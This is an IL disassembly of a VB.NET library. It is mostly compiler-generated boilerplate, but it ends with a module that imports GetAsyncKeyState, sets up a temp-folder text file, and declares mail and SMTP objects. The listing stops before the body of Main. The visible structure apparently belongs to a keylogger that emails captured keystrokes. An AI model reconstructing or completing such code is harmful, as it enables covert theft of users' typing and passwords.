
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.8.3928.0
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v4.0.30319
.module extern user32
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 10:0:0:0
}
.assembly Library
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 02 00 00 00 00 00 ) 

  .custom instance void [mscorlib]System.Reflection.AssemblyTitleAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyDescriptionAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCompanyAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyProductAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCopyrightAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyTrademarkAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.GuidAttribute::.ctor(string) = ( 01 00 24 63 30 61 33 39 61 65 64 2D 39 63 34 35   // ..$c0a39aed-9c45
                                                                                                  2D 34 36 64 39 2D 39 33 32 36 2D 62 61 30 37 61   // -46d9-9326-ba07a
                                                                                                  65 38 65 31 64 38 33 00 00 )                      // e8e1d83..
  .custom instance void [mscorlib]System.Reflection.AssemblyFileVersionAttribute::.ctor(string) = ( 01 00 07 30 2E 30 2E 30 2E 30 00 00 )             // ...0.0.0.0..
  .custom instance void [mscorlib]System.Runtime.Versioning.TargetFrameworkAttribute::.ctor(string) = ( 01 00 1C 2E 4E 45 54 46 72 61 6D 65 77 6F 72 6B   // ....NETFramework
                                                                                                        2C 56 65 72 73 69 6F 6E 3D 76 34 2E 37 2E 32 01   // ,Version=v4.7.2.
                                                                                                        00 54 0E 14 46 72 61 6D 65 77 6F 72 6B 44 69 73   // .T..FrameworkDis
                                                                                                        70 6C 61 79 4E 61 6D 65 14 2E 4E 45 54 20 46 72   // playName..NET Fr
                                                                                                        61 6D 65 77 6F 72 6B 20 34 2E 37 2E 32 )          // amework 4.7.2
  .hash algorithm 0x00008004
  .ver 0:0:0:0
}
.mresource public Library.Resources.resources
{
  // Offset: 0x00000000 Length: 0x000000B4
  // WARNING: managed resource file Library.Resources.resources created
}
.module Library.dll
// MVID: {D2CA0234-269D-4E3D-A5A2-38326AC54946}
.imagebase 0x10000000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0003       // WINDOWS_CUI
.corflags 0x00000001    //  ILONLY
// Image base: 0x06AE0000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi Library.My.MyApplication
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase::.ctor()
    IL_0006:  ret
  } // end of method MyApplication::.ctor

} // end of class Library.My.MyApplication

.class private auto ansi Library.My.MyComputer
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0006:  ret
  } // end of method MyComputer::.ctor

} // end of class Library.My.MyComputer

.class private auto ansi sealed beforefieldinit Library.My.MyProject
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .class auto ansi sealed nested assembly MyWebServices
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string,
                                                                                                         string,
                                                                                                         string,
                                                                                                         string) = ( 01 00 34 53 79 73 74 65 6D 2E 57 65 62 2E 53 65   // ..4System.Web.Se
                                                                                                                     72 76 69 63 65 73 2E 50 72 6F 74 6F 63 6F 6C 73   // rvices.Protocols
                                                                                                                     2E 53 6F 61 70 48 74 74 70 43 6C 69 65 6E 74 50   // .SoapHttpClientP
                                                                                                                     72 6F 74 6F 63 6F 6C 12 43 72 65 61 74 65 5F 5F   // rotocol.Create__
                                                                                                                     49 6E 73 74 61 6E 63 65 5F 5F 13 44 69 73 70 6F   // Instance__.Dispo
                                                                                                                     73 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 00 00   // se__Instance__..
                                                                                                                     00 ) 
    .method public hidebysig strict virtual 
            instance bool  Equals(object o) cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       13 (0xd)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  ldarg.1
      IL_0002:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0007:  call       instance bool [mscorlib]System.Object::Equals(object)
      IL_000c:  ret
    } // end of method MyWebServices::Equals

    .method public hidebysig strict virtual 
            instance int32  GetHashCode() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance int32 [mscorlib]System.Object::GetHashCode()
      IL_0006:  ret
    } // end of method MyWebServices::GetHashCode

    .method assembly hidebysig instance class [mscorlib]System.Type 
            GetType() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       11 (0xb)
      .maxstack  8
      IL_0000:  ldtoken    Library.My.MyProject/MyWebServices
      IL_0005:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_000a:  ret
    } // end of method MyWebServices::GetType

    .method public hidebysig strict virtual 
            instance string  ToString() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance string [mscorlib]System.Object::ToString()
      IL_0006:  ret
    } // end of method MyWebServices::ToString

    .method private static !!T  Create__Instance__<.ctor T>(!!T 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       20 (0x14)
      .maxstack  1
      .locals init (!!T V_0)
      IL_0000:  ldarg.0
      IL_0001:  box        !!T
      IL_0006:  brtrue.s   IL_0010

      IL_0008:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()
      IL_000d:  stloc.0
      IL_000e:  br.s       IL_0012

      IL_0010:  ldarg.0
      IL_0011:  stloc.0
      IL_0012:  ldloc.0
      IL_0013:  ret
    } // end of method MyWebServices::Create__Instance__

    .method private instance void  Dispose__Instance__<T>(!!T& 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       8 (0x8)
      .maxstack  8
      IL_0000:  ldarg.1
      IL_0001:  initobj    !!T
      IL_0007:  ret
    } // end of method MyWebServices::Dispose__Instance__

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method MyWebServices::.ctor

  } // end of class MyWebServices

  .class auto ansi sealed nested assembly ThreadSafeObjectProvider`1<.ctor T>
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
    .field private initonly class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.Internal.ContextValue`1<!T> m_Context
    .method assembly specialname instance !T 
            get_GetInstance() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       40 (0x28)
      .maxstack  2
      .locals init (!T V_0)
      IL_0000:  ldarg.0
      IL_0001:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.Internal.ContextValue`1<!0> class Library.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_Context
      IL_0006:  callvirt   instance !0 class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.Internal.ContextValue`1<!T>::get_Value()
      IL_000b:  stloc.0
      IL_000c:  ldloc.0
      IL_000d:  box        !T
      IL_0012:  brtrue.s   IL_0026

      IL_0014:  call       !!0 [mscorlib]System.Activator::CreateInstance<!T>()
      IL_0019:  stloc.0
      IL_001a:  ldarg.0
      IL_001b:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.Internal.ContextValue`1<!0> class Library.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_Context
      IL_0020:  ldloc.0
      IL_0021:  callvirt   instance void class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.Internal.ContextValue`1<!T>::set_Value(!0)
      IL_0026:  ldloc.0
      IL_0027:  ret
    } // end of method ThreadSafeObjectProvider`1::get_GetInstance

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       18 (0x12)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ldarg.0
      IL_0007:  newobj     instance void class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.Internal.ContextValue`1<!T>::.ctor()
      IL_000c:  stfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.Internal.ContextValue`1<!0> class Library.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_Context
      IL_0011:  ret
    } // end of method ThreadSafeObjectProvider`1::.ctor

    .property instance !T GetInstance()
    {
      .get instance !T Library.My.MyProject/ThreadSafeObjectProvider`1::get_GetInstance()
    } // end of property ThreadSafeObjectProvider`1::GetInstance
  } // end of class ThreadSafeObjectProvider`1

  .field private static initonly class Library.My.MyProject/ThreadSafeObjectProvider`1<class Library.My.MyComputer> m_ComputerObjectProvider
  .field private static initonly class Library.My.MyProject/ThreadSafeObjectProvider`1<class Library.My.MyApplication> m_AppObjectProvider
  .field private static initonly class Library.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> m_UserObjectProvider
  .field private static initonly class Library.My.MyProject/ThreadSafeObjectProvider`1<class Library.My.MyProject/MyWebServices> m_MyWebServicesObjectProvider
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       41 (0x29)
    .maxstack  8
    IL_0000:  newobj     instance void class Library.My.MyProject/ThreadSafeObjectProvider`1<class Library.My.MyComputer>::.ctor()
    IL_0005:  stsfld     class Library.My.MyProject/ThreadSafeObjectProvider`1<class Library.My.MyComputer> Library.My.MyProject::m_ComputerObjectProvider
    IL_000a:  newobj     instance void class Library.My.MyProject/ThreadSafeObjectProvider`1<class Library.My.MyApplication>::.ctor()
    IL_000f:  stsfld     class Library.My.MyProject/ThreadSafeObjectProvider`1<class Library.My.MyApplication> Library.My.MyProject::m_AppObjectProvider
    IL_0014:  newobj     instance void class Library.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::.ctor()
    IL_0019:  stsfld     class Library.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> Library.My.MyProject::m_UserObjectProvider
    IL_001e:  newobj     instance void class Library.My.MyProject/ThreadSafeObjectProvider`1<class Library.My.MyProject/MyWebServices>::.ctor()
    IL_0023:  stsfld     class Library.My.MyProject/ThreadSafeObjectProvider`1<class Library.My.MyProject/MyWebServices> Library.My.MyProject::m_MyWebServicesObjectProvider
    IL_0028:  ret
  } // end of method MyProject::.cctor

  .method assembly specialname static class Library.My.MyComputer 
          get_Computer() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class Library.My.MyProject/ThreadSafeObjectProvider`1<class Library.My.MyComputer> Library.My.MyProject::m_ComputerObjectProvider
    IL_0005:  callvirt   instance !0 class Library.My.MyProject/ThreadSafeObjectProvider`1<class Library.My.MyComputer>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Computer

  .method assembly specialname static class Library.My.MyApplication 
          get_Application() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class Library.My.MyProject/ThreadSafeObjectProvider`1<class Library.My.MyApplication> Library.My.MyProject::m_AppObjectProvider
    IL_0005:  callvirt   instance !0 class Library.My.MyProject/ThreadSafeObjectProvider`1<class Library.My.MyApplication>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Application

  .method assembly specialname static class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User 
          get_User() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class Library.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> Library.My.MyProject::m_UserObjectProvider
    IL_0005:  callvirt   instance !0 class Library.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_User

  .method assembly specialname static class Library.My.MyProject/MyWebServices 
          get_WebServices() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class Library.My.MyProject/ThreadSafeObjectProvider`1<class Library.My.MyProject/MyWebServices> Library.My.MyProject::m_MyWebServicesObjectProvider
    IL_0005:  callvirt   instance !0 class Library.My.MyProject/ThreadSafeObjectProvider`1<class Library.My.MyProject/MyWebServices>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_WebServices

  .property class Library.My.MyComputer Computer()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 43 6F 6D 70 75 74 65 72 00 00 ) // ...My.Computer..
    .get class Library.My.MyComputer Library.My.MyProject::get_Computer()
  } // end of property MyProject::Computer
  .property class Library.My.MyApplication
          Application()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 41 70 70 6C 69 63 61 74 69 6F   // ...My.Applicatio
                                                                                                       6E 00 00 )                                        // n..
    .get class Library.My.MyApplication Library.My.MyProject::get_Application()
  } // end of property MyProject::Application
  .property class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User
          User()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 07 4D 79 2E 55 73 65 72 00 00 )             // ...My.User..
    .get class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User Library.My.MyProject::get_User()
  } // end of property MyProject::User
  .property class Library.My.MyProject/MyWebServices
          WebServices()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 57 65 62 53 65 72 76 69 63 65   // ...My.WebService
                                                                                                       73 00 00 )                                        // s..
    .get class Library.My.MyProject/MyWebServices Library.My.MyProject::get_WebServices()
  } // end of property MyProject::WebServices
} // end of class Library.My.MyProject

.class private auto ansi sealed Library.My.Resources.Resources
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 33 53 79 73 74 65 6D 2E 52 65 73 6F 75 72   // ..3System.Resour
                                                                                                  63 65 73 2E 54 6F 6F 6C 73 2E 53 74 72 6F 6E 67   // ces.Tools.Strong
                                                                                                  6C 79 54 79 70 65 64 52 65 73 6F 75 72 63 65 42   // lyTypedResourceB
                                                                                                  75 69 6C 64 65 72 08 31 36 2E 30 2E 30 2E 30 00   // uilder.16.0.0.0.
                                                                                                  00 ) 
  .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private static class [mscorlib]System.Resources.ResourceManager resourceMan
  .field private static class [mscorlib]System.Globalization.CultureInfo resourceCulture
  .method assembly specialname static class [mscorlib]System.Resources.ResourceManager 
          get_ResourceManager() cil managed
  {
    // Code size       49 (0x31)
    .maxstack  8
    IL_0000:  ldsfld     class [mscorlib]System.Resources.ResourceManager Library.My.Resources.Resources::resourceMan
    IL_0005:  ldnull
    IL_0006:  call       bool [mscorlib]System.Object::ReferenceEquals(object,
                                                                       object)
    IL_000b:  brfalse.s  IL_002b

    IL_000d:  ldstr      "Library.Resources"
    IL_0012:  ldtoken    Library.My.Resources.Resources
    IL_0017:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_001c:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Type::get_Assembly()
    IL_0021:  newobj     instance void [mscorlib]System.Resources.ResourceManager::.ctor(string,
                                                                                         class [mscorlib]System.Reflection.Assembly)
    IL_0026:  stsfld     class [mscorlib]System.Resources.ResourceManager Library.My.Resources.Resources::resourceMan
    IL_002b:  ldsfld     class [mscorlib]System.Resources.ResourceManager Library.My.Resources.Resources::resourceMan
    IL_0030:  ret
  } // end of method Resources::get_ResourceManager

  .method assembly specialname static class [mscorlib]System.Globalization.CultureInfo 
          get_Culture() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  ldsfld     class [mscorlib]System.Globalization.CultureInfo Library.My.Resources.Resources::resourceCulture
    IL_0005:  ret
  } // end of method Resources::get_Culture

  .method assembly specialname static void 
          set_Culture(class [mscorlib]System.Globalization.CultureInfo Value) cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  stsfld     class [mscorlib]System.Globalization.CultureInfo Library.My.Resources.Resources::resourceCulture
    IL_0006:  ret
  } // end of method Resources::set_Culture

  .property class [mscorlib]System.Resources.ResourceManager
          ResourceManager()
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) 
    .get class [mscorlib]System.Resources.ResourceManager Library.My.Resources.Resources::get_ResourceManager()
  } // end of property Resources::ResourceManager
  .property class [mscorlib]System.Globalization.CultureInfo
          Culture()
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) 
    .get class [mscorlib]System.Globalization.CultureInfo Library.My.Resources.Resources::get_Culture()
    .set void Library.My.Resources.Resources::set_Culture(class [mscorlib]System.Globalization.CultureInfo)
  } // end of property Resources::Culture
} // end of class Library.My.Resources.Resources

.class private auto ansi sealed beforefieldinit Library.My.MySettings
       extends [System]System.Configuration.ApplicationSettingsBase
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 4B 4D 69 63 72 6F 73 6F 66 74 2E 56 69 73   // ..KMicrosoft.Vis
                                                                                                  75 61 6C 53 74 75 64 69 6F 2E 45 64 69 74 6F 72   // ualStudio.Editor
                                                                                                  73 2E 53 65 74 74 69 6E 67 73 44 65 73 69 67 6E   // s.SettingsDesign
                                                                                                  65 72 2E 53 65 74 74 69 6E 67 73 53 69 6E 67 6C   // er.SettingsSingl
                                                                                                  65 46 69 6C 65 47 65 6E 65 72 61 74 6F 72 08 31   // eFileGenerator.1
                                                                                                  36 2E 33 2E 30 2E 30 00 00 )                      // 6.3.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) 
  .field private static class Library.My.MySettings defaultInstance
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       21 (0x15)
    .maxstack  8
    IL_0000:  newobj     instance void Library.My.MySettings::.ctor()
    IL_0005:  call       class [System]System.Configuration.SettingsBase [System]System.Configuration.SettingsBase::Synchronized(class [System]System.Configuration.SettingsBase)
    IL_000a:  castclass  Library.My.MySettings
    IL_000f:  stsfld     class Library.My.MySettings Library.My.MySettings::defaultInstance
    IL_0014:  ret
  } // end of method MySettings::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System]System.Configuration.ApplicationSettingsBase::.ctor()
    IL_0006:  ret
  } // end of method MySettings::.ctor

  .method public specialname static class Library.My.MySettings 
          get_Default() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  ldsfld     class Library.My.MySettings Library.My.MySettings::defaultInstance
    IL_0005:  ret
  } // end of method MySettings::get_Default

  .property class Library.My.MySettings Default()
  {
    .get class Library.My.MySettings Library.My.MySettings::get_Default()
  } // end of property MySettings::Default
} // end of class Library.My.MySettings

.class private auto ansi sealed Library.My.MySettingsProperty
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .method assembly specialname static class Library.My.MySettings 
          get_Settings() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  call       class Library.My.MySettings Library.My.MySettings::get_Default()
    IL_0005:  ret
  } // end of method MySettingsProperty::get_Settings

  .property class Library.My.MySettings Settings()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 53 65 74 74 69 6E 67 73 00 00 ) // ...My.Settings..
    .get class Library.My.MySettings Library.My.MySettingsProperty::get_Settings()
  } // end of property MySettingsProperty::Settings
} // end of class Library.My.MySettingsProperty

.class public auto ansi sealed beforefieldinit Library.Module1
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .field public static object l
  .field public static object q
  .field public static object t
  .field public static object p
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       53 (0x35)
    .maxstack  8
    IL_0000:  ldnull
    IL_0001:  stsfld     object Library.Module1::l
    IL_0006:  ldc.i4.0
    IL_0007:  box        [mscorlib]System.Int32
    IL_000c:  stsfld     object Library.Module1::q
    IL_0011:  ldstr      ".txt"
    IL_0016:  stsfld     object Library.Module1::t
    IL_001b:  ldstr      "temp"
    IL_0020:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0025:  ldstr      "\\"
    IL_002a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_002f:  stsfld     object Library.Module1::p
    IL_0034:  ret
  } // end of method Module1::.cctor

  .method public static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int16  GetAsyncKeyState(int32 vKey) cil managed preservesig
  {
  }
  .method public static void  Main() cil managed
  {
    // Code size       3044 (0xbe4)
    .maxstack  10
    .locals init (int32 V_0,
             int32 V_1,
             object V_2,
             object V_3,
             object V_4,
             object V_5,
             class [System]System.Net.Mail.MailMessage V_6,
             object V_7,
             object[] V_8,
             bool[] V_9,
             class [System]System.Net.Mail.SmtpClient V_10,
             string[] V_11,
             int32 V_12,
             string V_13)
